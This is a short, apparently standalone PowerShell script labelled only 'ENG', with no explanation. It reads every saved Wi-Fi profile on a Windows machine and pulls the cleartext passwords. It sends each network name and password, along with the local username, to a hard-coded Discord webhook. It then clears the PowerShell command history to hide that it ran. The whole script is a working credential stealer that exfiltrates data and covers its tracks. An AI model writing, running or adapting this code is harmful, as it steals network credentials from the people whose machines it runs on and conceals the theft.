# ENG
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan = $_.Matches[0].Value.Trim()
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object { $_.Matches[0].Value.Trim() }

    $Body = @{
        'username' = $env:USERNAME
        'content'  = "SSID: " + $wlan + " | Password: " + $passw
    }
    
    Invoke-RestMethod -ContentType 'application/json' -Uri 'https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30' -Method Post -Body ($Body | ConvertTo-Json)
}

# Clear the PowerShell command history
Clear-History